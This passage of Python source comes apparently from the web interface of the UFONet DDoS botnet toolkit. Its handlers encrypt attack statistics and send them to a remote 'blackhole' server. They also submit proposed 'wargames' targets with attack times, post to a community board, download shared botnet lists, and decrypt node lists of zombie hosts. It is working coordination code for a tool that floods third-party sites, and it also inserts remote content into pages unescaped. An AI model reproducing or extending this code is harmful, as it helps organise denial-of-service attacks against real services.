                    self.encrypt(grid_key, grid_nuke)
                    if self.encryptedtext:
                        grid_nuke = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_tachyon = str(i[15])
                    self.encrypt(grid_key, grid_tachyon)
                    if self.encryptedtext:
                        grid_tachyon = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_monlist = str(i[16])
                    self.encrypt(grid_key, grid_monlist)
                    if self.encryptedtext:
                        grid_monlist = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_fraggle = str(i[17])
                    self.encrypt(grid_key, grid_fraggle)
                    if self.encryptedtext:
                        grid_fraggle = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_sniper = str(i[18])
                    self.encrypt(grid_key, grid_sniper)
                    if self.encryptedtext:
                        grid_sniper = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_ufoack = str(i[19])
                    self.encrypt(grid_key, grid_ufoack)
                    if self.encryptedtext:
                        grid_ufoack = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_uforst = str(i[20])
                    self.encrypt(grid_key, grid_uforst)
                    if self.encryptedtext:
                        grid_uforst = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_droper = str(i[21])
                    self.encrypt(grid_key, grid_droper)
                    if self.encryptedtext:
                        grid_droper = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_overlap = str(i[22])
                    self.encrypt(grid_key, grid_overlap)
                    if self.encryptedtext:
                        grid_overlap = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_pinger = str(i[23])
                    self.encrypt(grid_key, grid_pinger)
                    if self.encryptedtext:
                        grid_pinger = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_ufoudp = str(i[24])
                    self.encrypt(grid_key, grid_ufoudp)
                    if self.encryptedtext:
                        grid_ufoudp = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_contact = str(i[25])
                    self.encrypt(grid_key, grid_contact)
                    if self.encryptedtext:
                        grid_contact = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    grid_id = str(i[26]) # id (plain id)
                    l = str(grid_nickname) + "#?#" + str(grid_ranking) + "#?#" + str(grid_totalchargo) + "#?#" + str(grid_dorking) + "#?#" + str(grid_transferred) + "#?#" + str(grid_maxchargo) + "#?#" + str(grid_missions) + "#?#" + str(grid_attacks) + "#?#" + str(grid_loic) + "#?#" + str(grid_loris) + "#?#" + str(grid_ufosyn) + "#?#" + str(grid_spray) + "#?#" + str(grid_smurf)+ "#?#" + str(grid_xmas) + "#?#" + str(grid_nuke) + "#?#" + str(grid_tachyon) + "#?#" + str(grid_monlist) + "#?#" + str(grid_fraggle) + "#?#" + str(grid_sniper) + "#?#" + str(grid_ufoack) + "#?#" + str(grid_uforst) + "#?#" + str(grid_droper) + "#?#" + str(grid_overlap) + "#?#" + str(grid_pinger) + "#?#" + str(grid_ufoudp) + "#?#" + str(grid_contact) + "#?#" + str(grid_id)
                    f.write(l + os.linesep)
                f.close()
            except:
                pass
        if page == "/cmd_grid_filter_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_grid_filter_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_transfer_grid":
            self.pages["/cmd_transfer_grid"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["grid_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                grid_key = pGet["grid_key"]
            except:
                grid_key = ""
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            if grid_key is not "": # stream creation + encryption + package send
                try:
                    grid_json_file = open(self.mothership_gridcfg_file, "r") # extract grid profile conf
                    grid_data = json.load(grid_json_file)
                    grid_json_file.close()
                    stats_json_file = open(self.mothership_stats_file, "r") # extract mothership stats
                    stats_data = json.load(stats_json_file)
                    stats_json_file.close()
                    nickname = grid_data["grid_nick"].encode('utf-8')
                    self.encrypt(grid_key, nickname)
                    if self.encryptedtext:
                        nickname = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer   
                    ranking = self.ranking
                    if ranking == "Rookie":
                        ranking = 1
                    elif ranking == "Mercenary":
                        ranking = 2
                    elif ranking == "Bandit":
                        ranking = 3
                    elif ranking == "UFOmmander!":
                        ranking = 4
                    elif ranking == "UFOl33t!":
                        ranking = 5      
                    else:
                        ranking = 1
                    self.encrypt(grid_key, str(ranking))
                    if self.encryptedtext:
                        ranking = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer   
                    chargo = self.total_botnet
                    self.encrypt(grid_key, str(chargo))
                    if self.encryptedtext:
                        chargo = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    dorking = stats_data["scanner"]
                    self.encrypt(grid_key, str(dorking))
                    if self.encryptedtext:
                        dorking = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    transferred = stats_data["transferred"]
                    self.encrypt(grid_key, str(transferred))
                    if self.encryptedtext:
                        transferred = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    max_chargo = stats_data["max_chargo"]
                    self.encrypt(grid_key, str(max_chargo))
                    if self.encryptedtext:
                        max_chargo = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    missions = stats_data["missions"]
                    self.encrypt(grid_key, str(missions))
                    if self.encryptedtext:
                        missions = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    attacks = stats_data["completed"]
                    self.encrypt(grid_key, str(attacks))
                    if self.encryptedtext:
                        attacks = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    loic = stats_data["loic"]
                    self.encrypt(grid_key, str(loic))
                    if self.encryptedtext:
                        loic = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    loris = stats_data["loris"]
                    self.encrypt(grid_key, str(loris))
                    if self.encryptedtext:
                        loris = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    ufosyn = stats_data["ufosyn"]
                    self.encrypt(grid_key, str(ufosyn))
                    if self.encryptedtext:
                        ufosyn = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    spray = stats_data["spray"]
                    self.encrypt(grid_key, str(spray))
                    if self.encryptedtext:
                        spray = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    smurf = stats_data["smurf"]
                    self.encrypt(grid_key, str(smurf))
                    if self.encryptedtext:
                        smurf = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    xmas = stats_data["xmas"]
                    self.encrypt(grid_key, str(xmas))
                    if self.encryptedtext:
                        xmas = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    nuke = stats_data["nuke"]
                    self.encrypt(grid_key, str(nuke))
                    if self.encryptedtext:
                        nuke = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    tachyon = stats_data["tachyon"]
                    self.encrypt(grid_key, str(tachyon))
                    if self.encryptedtext:
                        tachyon = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    monlist = stats_data["monlist"]
                    self.encrypt(grid_key, str(monlist))
                    if self.encryptedtext:
                        monlist = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    fraggle = stats_data["fraggle"]
                    self.encrypt(grid_key, str(fraggle))
                    if self.encryptedtext:
                        fraggle = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    sniper = stats_data["sniper"]
                    self.encrypt(grid_key, str(sniper))
                    if self.encryptedtext:
                        sniper = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    ufoack = stats_data["ufoack"]
                    self.encrypt(grid_key, str(ufoack))
                    if self.encryptedtext:
                        ufoack = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    uforst = stats_data["uforst"]
                    self.encrypt(grid_key, str(uforst))
                    if self.encryptedtext:
                        uforst = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    droper = stats_data["droper"]
                    self.encrypt(grid_key, str(droper))
                    if self.encryptedtext:
                        droper = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    overlap = stats_data["overlap"]
                    self.encrypt(grid_key, str(overlap))
                    if self.encryptedtext:
                        overlap = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    pinger = stats_data["pinger"]
                    self.encrypt(grid_key, str(pinger))
                    if self.encryptedtext:
                        pinger = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    ufoudp = stats_data["ufoudp"]
                    self.encrypt(grid_key, str(ufoudp))
                    if self.encryptedtext:
                        ufoudp = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    contact = grid_data["grid_contact"].encode('utf-8')
                    self.encrypt(grid_key, str(contact))
                    if self.encryptedtext:
                        contact = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer  
                    id = grid_data["grid_token"] #  plain text
                    stream = str(nickname)+grid_msg_sep+str(ranking)+grid_msg_sep+str(chargo)+grid_msg_sep+str(dorking)+grid_msg_sep+str(transferred)+grid_msg_sep+str(max_chargo)+grid_msg_sep+str(missions)+grid_msg_sep+str(attacks)+grid_msg_sep+str(loic)+grid_msg_sep+str(loris)+grid_msg_sep+str(ufosyn)+grid_msg_sep+str(spray)+grid_msg_sep+str(smurf)+grid_msg_sep+str(xmas)+grid_msg_sep+str(nuke)+grid_msg_sep+str(tachyon)+grid_msg_sep+str(monlist)+grid_msg_sep+str(fraggle)+grid_msg_sep+str(sniper)+grid_msg_sep+str(ufoack)+grid_msg_sep+str(uforst)+grid_msg_sep+str(droper)+grid_msg_sep+str(overlap)+grid_msg_sep+str(pinger)+grid_msg_sep+str(ufoudp)+grid_msg_sep+str(contact)+grid_msg_sep+str(id)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        gs.settimeout(5.0)
                        gs.connect((host, cport))
                        gs.send(stream.encode())
                        gs.close()
                        try: # download latest grid after submit
                            grid = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/grid.txt').read().decode('utf-8')
                            f = open(self.grid_file, "w") # write updates to grid.txt
                            f.write(grid)
                            f.close()
                        except:
                            pass
                        grid_trans = "[Info] [AI] Statistics transferred! -> [OK!]\n"
                    except:
                        grid_trans = "[Error] [AI] Something wrong uploading statistics. Try it again...\n"
                except:
                    grid_trans = "[Error] [AI] Something wrong uploading statistics. Try it again...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(grid_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_transfer_grid_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_transfer_grid_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_transfer_wargame":
            self.pages["/cmd_transfer_wargame"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["wargames_source2"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                wargames_enckey = pGet["wargames_enckey"]
            except:
                wargames_enckey = ""
            wargames_creation = strftime("%d-%m-%Y %H:%M:%S", gmtime())
            wargames_target = pGet["wargames_target"]
            if wargames_target.startswith("http://") or wargames_target.startswith("https://"): # parse proposed target url
                t = urlparse(wargames_target)
                wargames_target = t.netloc
            else:
                wargames_trans = "[Error] [AI] Proposed target hasn't a correct format!. Try it again...\n"
                wargames_enckey = ""
            if wargames_target.startswith("www."):
                wargames_target = wargames_target.replace("www.","")
            wargames_estimated = pGet["wargames_estimated"]
            try:
                wargames_creation = strptime(wargames_creation, "%d-%m-%Y %H:%M:%S")
                wargames_estimated = strptime(wargames_estimated, "%d-%m-%Y %H:%M:%S")
                if (wargames_creation > wargames_estimated) == True: # parse bad dates
                    wargames_trans = "[Error] [AI] Date time should be major than creation time. Try it again...\n"
                    wargames_enckey = ""
            except:
                wargames_trans = "[Error] [AI] Date time is not using a correct format!. Try it again...\n"
                wargames_enckey = ""
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            if wargames_enckey is not "": # stream creation + encryption + package send
                wargames_creation = strftime("%d-%m-%Y %H:%M:%S", wargames_creation)
                wargames_estimated = strftime("%d-%m-%Y %H:%M:%S", wargames_estimated)
                try:
                    self.encrypt(wargames_enckey, wargames_creation)
                    if self.encryptedtext:
                        wargames_creation = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    self.encrypt(wargames_enckey, wargames_target)
                    if self.encryptedtext:
                        wargames_target = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    self.encrypt(wargames_enckey, wargames_estimated)
                    if self.encryptedtext:
                        wargames_estimated = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    stream = str(wargames_creation)+wargames_msg_sep+str(wargames_target)+wargames_msg_sep+str(wargames_estimated)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        gs.settimeout(5.0)
                        gs.connect((host, cport))
                        gs.send(stream.encode())
                        gs.close()
                        try: # download latest wargames after submit
                            wargames = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/wargames.txt').read().decode('utf-8')
                            f = open(self.wargames_file, "w") # write updates to wargames.txt
                            f.write(wargames)
                            f.close()
                        except:
                            pass
                        wargames_trans = "[Info] [AI] Wargame transferred! -> [OK!]\n"
                    except:
                        wargames_trans = "[Error] [AI] Something wrong uploading wargame. Try it again...\n"
                except:
                    wargames_trans = "[Error] [AI] Something wrong uploading wargame. Try it again...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(wargames_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_transfer_wargame_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_transfer_wargame_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_transfer_link":
            self.pages["/cmd_transfer_link"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["link_source2"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                link_enckey = pGet["link_enckey"]
            except:
                link_enckey = ""
            link_creation = strftime("%d-%m-%Y %H:%M:%S", gmtime())
            link_url = pGet["link_url"]
            if link_url.startswith("http://") or link_url.startswith("https://"): # parse proposed link
                pass
            else:
                links_trans = "[Error] [AI] Proposed link hasn't a correct format!. Try it again...\n"
                link_enckey = ""
            if link_url.startswith("www."):
                link_url = link_url.replace("www.","")
            link_topic = pGet["link_topic"]
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            if link_enckey is not "": # stream creation + encryption + package send
                try:
                    self.encrypt(link_enckey, link_creation)
                    if self.encryptedtext:
                        link_creation = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    self.encrypt(link_enckey, link_url)
                    if self.encryptedtext:
                        link_url = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    self.encrypt(link_enckey, link_topic)
                    if self.encryptedtext:
                        link_topic = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    stream = str(link_creation)+links_msg_sep+str(link_url)+links_msg_sep+str(link_topic)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        gs.settimeout(5.0)
                        gs.connect((host, cport))
                        gs.send(stream.encode())
                        gs.close()
                        try: # download latest links after submit
                            links = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/links.txt').read().decode('utf-8')
                            f = open(self.links_file, "w") # write updates to links.txt
                            f.write(links)
                            f.close()
                        except:
                            pass
                        links_trans = "[Info] [AI] Link transferred! -> [OK!]\n"
                    except:
                        links_trans = "[Error] [AI] Something wrong uploading link. Try it again...\n"
                except:
                    links_trans = "[Error] [AI] Something wrong uploading link. Try it again...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(links_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_transfer_link_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_transfer_link_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_transfer_stream":
            self.pages["/cmd_transfer_stream"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["stream_source2"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                stream_enckey = pGet["stream_enckey"]
            except:
                stream_enckey = ""
            stream_creation = strftime("%d-%m-%Y %H:%M:%S", gmtime())
            stream_url = pGet["stream_url"]
            if stream_url.startswith("http://") or stream_url.startswith("https://"): # parse proposed stream
                pass
            else:
                streams_trans = "[Error] [AI] Proposed stream hasn't a correct format!. Try it again...\n"
                stream_enckey = ""
            if stream_url.startswith("www."):
                stream_url = stream_url.replace("www.","")
            stream_topic = pGet["stream_topic"]
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            if stream_enckey is not "": # stream creation + encryption + package send
                try:
                    self.encrypt(stream_enckey, stream_creation)
                    if self.encryptedtext:
                        stream_creation = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    self.encrypt(stream_enckey, stream_url)
                    if self.encryptedtext:
                        stream_url = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    self.encrypt(stream_enckey, stream_topic)
                    if self.encryptedtext:
                        stream_topic = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    stream = str(stream_creation)+streams_msg_sep+str(stream_url)+streams_msg_sep+str(stream_topic)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        gs.settimeout(5.0)
                        gs.connect((host, cport))
                        gs.send(stream.encode())
                        gs.close()
                        try: # download latest links after submit
                            streams = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/streams.txt').read().decode('utf-8')
                            f = open(self.streams_file, "w") # write updates to streams.txt
                            f.write(streams)
                            f.close()
                        except:
                            pass
                        streams_trans = "[Info] [AI] Stream transferred! -> [OK!]\n"
                    except:
                        streams_trans = "[Error] [AI] Something wrong uploading stream. Try it again...\n"
                except:
                    streams_trans = "[Error] [AI] Something wrong uploading stream. Try it again...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(streams_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_transfer_stream_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_transfer_stream_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_transfer_globalnet":
            self.pages["/cmd_transfer_globalnet"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["globalnet_source2"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                globalnet_enckey = pGet["globalnet_enckey"]
            except:
                globalnet_enckey = ""
            globalnet_owner = pGet["globalnet_owner"]
            if len(globalnet_owner) < 3 or len(globalnet_owner) > 12: # default owner
                globalnet_owner = "Anonymous"
            globalnet_comment = pGet["globalnet_comment"]
            if len(globalnet_comment) < 3 or len(globalnet_comment) > 90: # default comment
                globalnet_comment = "-"
            globalnet_warp = pGet["globalnet_warp"]
            try:
                globalnet_ip = requests.get(check_ip_service3).text
            except:
                try:
                    globalnet_ip = requests.get(check_ip_service2).text
                except:
                    try:
                        globalnet_ip = requests.get(check_ip_service1).text
                    except:
                        globalnet_ip = "Unknown!"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            if globalnet_enckey is not "": # stream creation + encryption + package send
                try:
                    self.encrypt(globalnet_enckey, globalnet_owner)
                    if self.encryptedtext:
                        globalnet_owner = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    self.encrypt(globalnet_enckey, globalnet_comment)
                    if self.encryptedtext:
                        globalnet_comment = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    self.encrypt(globalnet_enckey, globalnet_warp)
                    if self.encryptedtext:
                        globalnet_warp = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    self.encrypt(globalnet_enckey, globalnet_ip)
                    if self.encryptedtext:
                        globalnet_ip = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    stream = str(globalnet_owner)+globalnet_msg_sep+str(globalnet_comment)+globalnet_msg_sep+str(globalnet_warp)+globalnet_msg_sep+str(globalnet_ip)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        gs.settimeout(5.0)
                        gs.connect((host, cport))
                        gs.send(stream.encode())
                        gs.close()
                        try: # download latest globalnet after submit
                            globalnet = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/globalnet.txt').read().decode('utf-8')
                            f = open(self.globalnet_file, "w") # write updates to globalnet.txt
                            f.write(globalnet)
                            f.close()
                        except:
                            pass
                        globalnet_trans = "[Info] [AI] Location transferred! -> [OK!]\n"
                    except:
                        globalnet_trans = "[Error] [AI] Something wrong uploading location. Try it again...\n"
                except:
                    globalnet_trans = "[Error] [AI] Something wrong uploading location. Try it again...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(globalnet_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_transfer_globalnet_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_transfer_globalnet_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_sync_board":
            self.pages["/cmd_sync_board"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["board_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                board = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/board.txt').read().decode('utf-8')
                f = open(self.board_file, "w") # write updates to board.txt
                f.write(board)
                f.close()
                self.board_text = board
            except:
                board = "[Error] [AI] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            f = open("/tmp/out", "w")
            f.write(str(board))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_board_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_board_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_send_message_board":
            self.pages["/cmd_send_message_board"] = "<pre>Waiting for 'blackhole' connection...</pre>"
            blackhole_ip = pGet["board_source"]
            blackhole_ip = urllib.parse.unquote(blackhole_ip)
            try:
                board_key = pGet["board_key"]
            except:
                board_key = ""
            try:
                board_topic = pGet["board_topic"]
            except:
                board_topic = ""
            try:
                board_message = pGet["stream_txt"]
            except:
                board_message = ""
            end_mark = "\n[Info] [AI] End of transmission. -> [Refreshing!]"
            if board_key is not "" or board_topic is not "" or board_message is not "": # stream creation (topic | icon | nick | id | comment) + encryption (board_key) + package send (default blackhole)
                try:  
                    board_json_file = open(self.mothership_boardcfg_file, "r") # extract board profile conf
                    board_data = json.load(board_json_file)
                    board_json_file.close()         
                    board_nickname = board_data["profile_nick"]
                    self.encrypt(board_key, board_nickname)
                    if self.encryptedtext:
                        board_nickname = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer 
                    board_icon = board_data["profile_icon"]
                    board_icon = board_icon.replace("link", "") # keep just icon number
                    board_id = board_data["profile_token"] 
                    self.encrypt(board_key, board_message)
                    if self.encryptedtext:
                        board_message = self.encryptedtext
                    self.encryptedtext = "" # clean encryptedtext buffer
                    if board_topic == "general":
                        board_topic = 1
                    elif board_topic == "opsec":
                        board_topic = 2
                    elif board_topic == "faq":
                        board_topic = 3
                    elif board_topic == "bugs":
                        board_topic = 4  
                    elif board_topic == "media":
                        board_topic = 5            
                    else:
                        board_topic = 1
                    stream = str(board_topic)+board_msg_sep+str(board_icon)+board_msg_sep+str(board_nickname)+board_msg_sep+str(board_id)+board_msg_sep+str(board_message)
                    try: 
                        host = blackhole_ip
                        cport = 9992 # port used by mothership grider (server side script)
                        gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                        gs.settimeout(30)
                        gs.connect((host, cport))
                        gs.send(stream.encode())
                        gs.close()
                        try: # download latest board after submit
                            board = urllib.request.urlopen('http://'+blackhole_ip+'/ufonet/board.txt').read().decode('utf-8')
                            f = open(self.board_file, "w") # write updates to board.txt
                            f.write(board)
                            f.close()
                        except:
                            pass
                        board_trans = "[Info] [AI] The message has been sent! -> [OK!]\n"
                    except:
                        board_trans = "[Error] [AI] Something wrong sending message to the board. Try it again...\n"
                except:
                    board_trans = "[Error] [AI] Something wrong sending message to the board. Try it again...\n"
            f = open("/tmp/out", "w")
            f.write(board_trans)
            f.write(end_mark)
            f.close()
        if page == "/cmd_send_message_board_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_send_message_board_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt":
            self.pages["/cmd_decrypt"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                news_key = pGet["news_key"]
            except:
                news_key = ""
            try:
                missions_key = pGet["missions_key"]
            except:
                missions_key = ""
            end_mark = "\n[Info] [AI] End of decryption."
            if news_key is not "": # news decryption
                self.decrypted_news = []
                nodec_text = "*** [This message cannot be solved with that KEY...]"
                news_key = pGet["news_key"]
                for news_text in self.list_news:
                    self.decrypt(news_key, news_text)
                    if self.decryptedtext:
                        if len(self.decryptedtext) < 2:
                            self.decrypted_news.append(nodec_text)
                        else:
                            self.decrypted_news.append(self.decryptedtext)
                    else:
                        self.decrypted_news.append(nodec_text)
                    self.decryptedtext = "" # clean decryptedtext buffer
                f = open("/tmp/out", "w")
                num_news = 0 # news counter
                for m in self.decrypted_news:
                    num_news = num_news + 1
                    f.write("["+str(num_news)+"] " + str(m)+"\n")
                f.write(end_mark)
                f.close()
            else:
                if missions_key is not "": # missions decryption
                    self.decrypted_missions = []
                    nodec_text = "*** [This message cannot be solved with that KEY...]"
                    missions_key = pGet["missions_key"]
                    for missions_text in self.list_missions:
                        self.decrypt(missions_key, missions_text)
                        if self.decryptedtext:
                            if len(self.decryptedtext) < 2:
                                self.decrypted_missions.append(nodec_text)
                            else:
                                self.decrypted_missions.append(self.decryptedtext)
                        else:
                            self.decrypted_missions.append(nodec_text)
                        self.decryptedtext = "" # clean decryptedtext buffer
                    f = open("/tmp/out", "w")
                    num_mission = 0 # missions counter
                    for m in self.decrypted_missions:
                        num_mission = num_mission + 1
                        f.write("["+str(num_mission)+"] " + str(m)+"\n") 
                    f.write(end_mark)
                    f.close()
                else: # blackholes (nodes.dat) decryption + data showing
                    self.decrypted_blackholes = []
                    nodec_text = "*** [This message cannot be solved with that key...]"
                    blackhole_key = pGet["blackhole_key"]
                    for blackholes_text in self.list_blackholes:
                        self.decrypt(blackhole_key, blackholes_text)
                        if self.decryptedtext:
                            self.decrypted_blackholes.append(self.decryptedtext)
                        else:
                            self.decrypted_blackholes.append(nodec_text)
                        self.decryptedtext = "" # clean decryptedtext buffer
                    f = open("/tmp/out", "w")
                    num_blackholes = 0 # blackholes counter
                    for b in self.decrypted_blackholes:
                        num_blackholes = num_blackholes + 1
                        if blackhole_sep in b: # IP | Mode | Comment | Actions
                            s = b.rsplit(blackhole_sep, 1)[0]
                            ip = str(s.rsplit(blackhole_sep, 1)[0])
                            mode =  str(s.rsplit(blackhole_sep, 1)[1])
                            if mode == "D": # Download only mode
                                mode = "<a href=javascript:runCommandX('cmd_download_community')>Download</a>"
                            elif mode == "U": # Upload only mode
                                mode = "<a href=javascript:runCommandX('cmd_upload_community')>Upload</a>"
                            else: # Upload/Download mode
                                mode = "<a href=javascript:runCommandX('cmd_download_community')>Download</a>" + " - " + "<a href=javascript:runCommandX('cmd_upload_community')>Upload</a>"
                            comment = str(b.rsplit(blackhole_sep, 1)[1])
                            b = ip + " " + blackhole_sep + " Botnet: " + mode + " " + blackhole_sep + " Comment: " + comment
                            f.write("["+str(num_blackholes)+"] " + str(b)+"\n")
                        else:
                            f.write("["+str(num_blackholes)+"] " + str(b)+"\n")
                    f.write(end_mark)
                    f.close()
        if page == "/cmd_decrypt_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/news":
            self.pages["/news"] = self.html_news()
        if page == "/missions":
            self.pages["/missions"] = self.html_missions()
        if page == "/board":
            self.pages["/board"] = self.html_board()
        if page == "/grid":
            self.pages["/grid"] = self.html_grid()
        if page == "/wargames":
